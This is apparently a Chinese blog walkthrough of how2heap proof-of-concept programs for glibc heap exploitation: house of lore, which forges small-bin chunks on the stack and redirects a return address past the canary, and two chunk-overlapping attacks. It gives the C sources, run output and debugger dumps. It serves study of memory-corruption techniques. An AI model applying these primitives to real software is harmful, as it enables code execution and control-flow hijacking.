---
title: how2heap-3
date: 2019-07-09 21:56:05
tags: pwn
---

# how2heap-3

<!--more-->

## house_of_lore

### 输出

```
$ ./glibc_2.25/house_of_lore 

Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x603010
stack_buffer_1 at 0x7fffffffdcc0
stack_buffer_2 at 0x7fffffffdca0
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x603080
Freeing the chunk 0x603010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: (nil)
victim->bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x603010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x603470
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7ffff7dd1bd8
victim->bk: 0x7ffff7dd1bd8

Now emulating a vulnerability that can overwrite the victim->bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7ffff7dd1bd8

p4 is 0x7fffffffdcd0 and should be on the stack!
Nice jump d00d
```

### 解释

> house of lore 技术主要是用来伪造一个 small bin 链。

> - House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。
> - House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。
> - House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。

如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下：

``` c++
/*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // 获取 small bin 的索引
        idx = smallbin_index(nb);
        // 获取对应 small bin 中的 chunk 指针
        bin = bin_at(av, idx);
        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
        // 如果 victim = bin ，那说明该 bin 为空。
        // 如果不相等，那么会有两种情况
        if ((victim = last(bin)) != bin) {
            // 第一种情况，small bin 还没有初始化。
            if (victim == 0) /* initialization check */
                // 执行初始化，将 fast bins 中的 chunk 进行合并
                malloc_consolidate(av);
            // 第二种情况，small bin 中存在空闲的 chunk
            else {
                // 获取 small bin 中倒数第二个 chunk 。
                bck = victim->bk;
                // 检查 bck->fd 是不是 victim，防止伪造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // 设置 victim 对应的 inuse 位
                set_inuse_bit_at_offset(victim, nb);
                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                bin->bk = bck;
                bck->fd = bin;
                // 如果不是 main_arena，设置对应的标志
                if (av != &main_arena) set_non_main_arena(victim);
                // 细致的检查
                check_malloced_chunk(av, victim, nb);
                // 将申请到的 chunk 转化为对应的 mem 状态
                void *p = chunk2mem(victim);
                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }
```

从下面的这部分我们可以看出

``` c++
            // 获取 small bin 中倒数第二个 chunk 。
            bck = victim->bk;
            // 检查 bck->fd 是不是 victim，防止伪造
            if (__glibc_unlikely(bck->fd != victim)) {
                errstr = "malloc(): smallbin double linked list corrupted";
                goto errout;
            }
            // 设置 victim 对应的 inuse 位
            set_inuse_bit_at_offset(victim, nb);
            // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
            bin->bk = bck;
            bck->fd = bin;
```

如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck->fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。


``` c++
  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
  fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);
```

首先在栈上分配两个数组，然后分配 victim chunk。这时 heap 上的第一个 small chunk。

`victim_chunk = victim - 2`: `victim - WORD_SIZE` 因为我们需要减去首部以获取 chunk 的绝对地址。

```
pwndbg> p victim
$3 = (intptr_t *) 0x603010
pwndbg> p victim_chunk 
$4 = (intptr_t *) 0x603000
pwndbg> heap
0x603000 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603070 PREV_INUSE {
  prev_size = 0, 
  size = 135057, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

接下来在栈上伪造两个 chunk：

``` c++
  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
```

对于第一块 chunk，fwd 指针指向 victim_chunk 以绕过检查。在最后 malloc 时，这一块会被放在 smallbin list 中。设置 bk 指针指向 stack_buffer_2，接下来设置 stack_buffer_2 的 fwd 指针指向 stack_buffer_1 以绕过 malloc 时针对 small bin 的检查，这回返回栈上 fake chunk 的指针。这样就构造了一个 small bin 链。

check 的检测如下：

``` c++
// Advanced exploitation of the House of Lore - Malloc Maleficarum.
// This PoC take care also of the glibc hardening of smallbin corruption.

// [ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

//       [ ... ]

```

伪造后的结构如下：

```
pwndbg> p stack_buffer_1
$8 = {0x0, 0x0, 0x603000, 0x7fffffffdc50}
pwndbg> p stack_buffer_2
$9 = {0x0, 0x0, 0x7fffffffdc70}
pwndbg> p &stack_buffer_1
$10 = (intptr_t *(*)[4]) 0x7fffffffdc70
pwndbg> p &stack_buffer_2
$11 = (intptr_t *(*)[3]) 0x7fffffffdc50
```

接下来申请一大块内存

``` c++
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);
```

申请这块内存的目的是在之后的 free 中避免 victim chunk 被合并进 top chunk 中。

然后释放 victim chunk。

``` c++
  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
```

它本应该被放入 unsorted bin 中的（我这里放入了 fastbins）

在 unsorted bin 中 victim 的 fwd 和 bk 指针都为空。

``` c++
  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
```

接下来 malloc 一块大 chunk，大到不能在 UnsortedBin 中找到合适的就可以了。这样 victim 会被整理到 smallbins 中。

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x70: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
largebins
empty
```

嗯，虽然我这里的 victim 之前在 fastbins 中，但是在这之后仍然被整理到了 smallbins 中。可以读源码看看对 unsortedbin 和 fastbins 的操作都有什么。

此时 victim chunk 的 fwd 和 bk 指针都被更新了：

```
victim->fwd: 0x7ffff7dd1bd8
victim->bk: 0x7ffff7dd1bd8
```

``` c++
  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------
```

接下来开始漏洞利用：假设我们可以修改 victim chunk 的 bk 指针，并让它指向我们栈上的 fake chunk。

修改前：

```
pwndbg> heap
0x603000 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x7ffff7dd1bd8 <main_arena+184>, 
  bk = 0x7ffff7dd1bd8 <main_arena+184>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x70: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
largebins
empty
pwndbg> x/20gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000071
0x603010:	0x00007ffff7dd1bd8	0x00007ffff7dd1bd8
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000070	0x00000000000003f0
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
```

修改后：

```
pwndbg> heap
0x603000 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x7ffff7dd1bd8 <main_arena+184>, 
  bk = 0x7fffffffdc70, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x70 [corrupted]
FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
BK: 0x603000 —▸ 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop    
largebins
empty
pwndbg> x/20gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000071
0x603010:	0x00007ffff7dd1bd8	0x00007fffffffdc70
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000070	0x00000000000003f0
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
```

这个时候，victim chunk 的 bk 指向了 stack_buffer_1，而我们之前设置了 stack_buffer_1 的 fd 指向了 victim_chunk。由于 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时的 small bin 链表整理如下：

```
fake chunk 2 <-- fake chunk 1 <-- victim chunk <-- head
```

fake chunk 2 的 bk 指向了一个未定义的地址。

> 如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。

``` c++
  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);
```

接下来我们 malloc 一块 chunk，如果我们 malloc 的大小恰好是 victim chunk 的大小（也就是第一块被 free 掉的内存），这时 glibc 会将 victim chunk 取出，设置它的 bk 为 victim 的 bk。

```
pwndbg> p p3
$12 = (void *) 0x603010
pwndbg> x/20xg p3-0x10 
0x603000:	0x0000000000000000	0x0000000000000071
0x603010:	0x00007ffff7dd1bd8	0x00007fffffffdc70
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000070	0x00000000000003f1
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
```

``` c++
  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
```

最后一次 malloc 时会欺骗 glibc 返回 bin->bk 指向的 chunk。在这次 malloc 后，stack_buffer_2 的 fwd 指针会发生改变，而且 p4 会在栈上。

```
pwndbg> p stack_buffer_2
$14 = {0x0, 0x0, 0x7ffff7dd1bd8 <main_arena+184>}
pwndbg> p p4
$15 = 0x7fffffffdc80 "\330\033\335\367\377\177"
```

``` c++
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
```

接下来我们就可以利用内存中的 shellcode 完成攻击了。

p4 + 40 是 main 函数的返回地址，被修改为 jackpot 的地址，执行流被重定向完成了攻击。

> 最后，我们说的是small bin 链的构造，其实我这里用的是 fastbin ，其释放后虽然是被加入到 fast bins 中，而small bin是释放后 放入 unsorted bin，但 malloc 之后，也会被整理到 small bins 里。

## overlapping_chunks

Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk

> 简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。

### 输出

```
$ ./glibc_2.25/overlapping_chunks

This is a simple chunks overlapping problem

Let's start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x603010
p2=0x603110
p3=0x603210

Now let's free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us
a region size of 376

Now let's allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x603110 and ends at 0x603288
p3 starts at 0x603210 and ends at 0x603288
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.

Let's run through an example. Right now, we have:
p4 = x���
3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4, '4', 376), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3, '3', 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�

```

### 解释

``` c++
	fprintf(stderr, "\nThis is a simple chunks overlapping problem\n\n");
	fprintf(stderr, "Let's start to allocate 3 chunks on the heap\n");

	p1 = malloc(0x100 - 8);
	p2 = malloc(0x100 - 8);
	p3 = malloc(0x80 - 8);

	fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x100 - 8);
	memset(p2, '2', 0x100 - 8);
	memset(p3, '3', 0x80 - 8);
```

首先申请三个 chunk，分别填充 1、2、3。

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 257, 
  fd = 0x3131313131313131, 
  bk = 0x3131313131313131, 
  fd_nextsize = 0x3131313131313131, 
  bk_nextsize = 0x3131313131313131
}
0x603100 PREV_INUSE {
  prev_size = 3544668469065756977, 
  size = 257, 
  fd = 0x3232323232323232, 
  bk = 0x3232323232323232, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
0x603200 FASTBIN {
  prev_size = 3617008641903833650, 
  size = 129, 
  fd = 0x3333333333333333, 
  bk = 0x3333333333333333, 
  fd_nextsize = 0x3333333333333333, 
  bk_nextsize = 0x3333333333333333
}
```

接下来 free chunk 2

``` c++
	fprintf(stderr, "\nNow let's free the chunk p2\n");
	free(p2);
	fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");
```
chunk 2 被分配到了 unsorted bin 中。

```
0x603100 PREV_INUSE {
  prev_size = 3544668469065756977, 
  size = 257, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
unsortedbin
all: 0x603100 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603100
```

``` c++
	fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"
		" however, it is best to maintain the stability of the heap.\n");
	fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
		" to assure that p1 is not mistaken for a free chunk.\n");
```

接下来我们假设有一个溢出可以覆盖 p2 的 size。尽管对于我们的程序来讲最后三位并不重要，但是为了堆的稳定性，最好还是不要随意改动。为了保持稳定性，我们至少要将最低位（LSB, prev_inuse）位保持为 1，这样 p1 就不会被误认为是一个未分配的块了。

``` c++
	int evil_chunk_size = 0x181;
	int evil_region_size = 0x180 - 8;
	fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
```

我们将 p2 的 size 改写为 0x181，之后 malloc 会返回给我们一个 0x178 大小的块。

修改前：

```
pwndbg> x/10xg p2-2
0x603100:	0x3131313131313131	0x0000000000000101
0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x603120:	0x3232323232323232	0x3232323232323232
0x603130:	0x3232323232323232	0x3232323232323232
0x603140:	0x3232323232323232	0x3232323232323232
```

修改后：

```
pwndbg> x/10xg p2-2
0x603100:	0x3131313131313131	0x0000000000000181
0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x603120:	0x3232323232323232	0x3232323232323232
0x603130:	0x3232323232323232	0x3232323232323232
0x603140:	0x3232323232323232	0x3232323232323232
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 257, 
  fd = 0x3131313131313131, 
  bk = 0x3131313131313131, 
  fd_nextsize = 0x3131313131313131, 
  bk_nextsize = 0x3131313131313131
}
0x603100 PREV_INUSE {
  prev_size = 3544668469065756977, 
  size = 385, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
0x603280 PREV_INUSE {
  prev_size = 3689348814741910323, 
  size = 134529, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

这时 chunk2 会吞并 chunk3。

``` c++
	fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);
```

``` c++
	fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	fprintf(stderr, "p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
	fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.\n");

	fprintf(stderr, "\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");
```

接下来再申请一块 0x178 大小的内存，malloc 会把 chunk2 和chunk3 一起分配出来。

```
pwndbg> p p4
$2 = (intptr_t *) 0x603110
pwndbg> p p2
$3 = (intptr_t *) 0x603110
pwndbg> p p3
$4 = (intptr_t *) 0x603210
p4 has been allocated at 0x603110 and ends at 0x603288
p3 starts at 0x603210 and ends at 0x603288
p4 should overlap with p3, in this case p4 includes all p3.
```

``` c++
	fprintf(stderr, "Let's run through an example. Right now, we have:\n");
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);
```

现在我们修改 p4 的时候，p3 也会被修改；修改 p3 的时候，p4 也会被修改。

## overlanpping_chunks_2

Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk.

> 同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。

### 解释

``` c++
  fprintf(stderr, "\nThis is a simple chunks overlapping problem");
  fprintf(stderr, "\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");
  fprintf(stderr, "\nLet's start to allocate 5 chunks on the heap:");

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr, "\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, "\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, "\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, "\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, "\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);
```

我们先 malloc 5 块 chunk，**第五块**的作用是防止 chunk4 free 后被放入 top chunk。这里的覆盖目标是 chunk2 到 chunk4。

首先 free chunk 4

``` c++
  fprintf(stderr, "\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"); 
  
  free(p4);
```

由于 chunk4 是 free 状态，p5 的 pre_size 如下：

```
pwndbg> p p5
$1 = (intptr_t *) 0x603fd0
pwndbg> x/20gx p5-4
0x603fb0:	0x4444444444444444	0x4444444444444444      <-- chunk 5
0x603fc0:	0x00000000000003f0	0x00000000000003f0      <-- prev_size   /   size
0x603fd0:	0x4545454545454545	0x4545454545454545
0x603fe0:	0x4545454545454545	0x4545454545454545
0x603ff0:	0x4545454545454545	0x4545454545454545
0x604000:	0x4545454545454545	0x4545454545454545
0x604010:	0x4545454545454545	0x4545454545454545
0x604020:	0x4545454545454545	0x4545454545454545
0x604030:	0x4545454545454545	0x4545454545454545
0x604040:	0x4545454545454545	0x4545454545454545
```

接下来假设 chunk1 有堆溢出

``` c++
  fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 
```

我们可以修改 chunk2 的 size。修改前：

```
pwndbg> p p2
$2 = (intptr_t *) 0x603400
pwndbg> x/20xg p2-2
0x6033f0:	0x4141414141414141	0x00000000000003f1      <-- size
0x603400:	0x4242424242424242	0x4242424242424242
0x603410:	0x4242424242424242	0x4242424242424242
0x603420:	0x4242424242424242	0x4242424242424242
0x603430:	0x4242424242424242	0x4242424242424242
0x603440:	0x4242424242424242	0x4242424242424242
0x603450:	0x4242424242424242	0x4242424242424242
0x603460:	0x4242424242424242	0x4242424242424242
0x603470:	0x4242424242424242	0x4242424242424242
0x603480:	0x4242424242424242	0x4242424242424242
```

修改后：

```
pwndbg> x/20xg p2-2
0x6033f0:	0x4141414141414141	0x00000000000007e1      <-- size
0x603400:	0x4242424242424242	0x4242424242424242
0x603410:	0x4242424242424242	0x4242424242424242
0x603420:	0x4242424242424242	0x4242424242424242
0x603430:	0x4242424242424242	0x4242424242424242
0x603440:	0x4242424242424242	0x4242424242424242
0x603450:	0x4242424242424242	0x4242424242424242
0x603460:	0x4242424242424242	0x4242424242424242
0x603470:	0x4242424242424242	0x4242424242424242
0x603480:	0x4242424242424242	0x4242424242424242
```

chunk2 的 size 值被修改为 chunk2 和 chunk3 的大小之和，最后一位是标志位。

``` c++
  fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
  fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n");
  free(p2);
```

这样当我们释放 chunk2 的时候，malloc 根据被修改的 size 值，会以为 chunk2 加上 chunk3 的区域都是要释放的，然后就错误地修改了 chunk5 的 prev_size。

修改前：

```
pwndbg> p p5
$3 = (intptr_t *) 0x603fd0
pwndbg> x/20xg p5-2
0x603fc0:	0x00000000000003f0	0x00000000000003f0      <-- prev_size   /   size
0x603fd0:	0x4545454545454545	0x4545454545454545
0x603fe0:	0x4545454545454545	0x4545454545454545
0x603ff0:	0x4545454545454545	0x4545454545454545
0x604000:	0x4545454545454545	0x4545454545454545
0x604010:	0x4545454545454545	0x4545454545454545
0x604020:	0x4545454545454545	0x4545454545454545
0x604030:	0x4545454545454545	0x4545454545454545
0x604040:	0x4545454545454545	0x4545454545454545
0x604050:	0x4545454545454545	0x4545454545454545
```

修改后：

```
pwndbg> x/20xg p5-2
0x603fc0:	0x0000000000000bd0	0x00000000000003f0      <-- prev_size   /   size
0x603fd0:	0x4545454545454545	0x4545454545454545
0x603fe0:	0x4545454545454545	0x4545454545454545
0x603ff0:	0x4545454545454545	0x4545454545454545
0x604000:	0x4545454545454545	0x4545454545454545
0x604010:	0x4545454545454545	0x4545454545454545
0x604020:	0x4545454545454545	0x4545454545454545
0x604030:	0x4545454545454545	0x4545454545454545
0x604040:	0x4545454545454545	0x4545454545454545
0x604050:	0x4545454545454545	0x4545454545454545
```

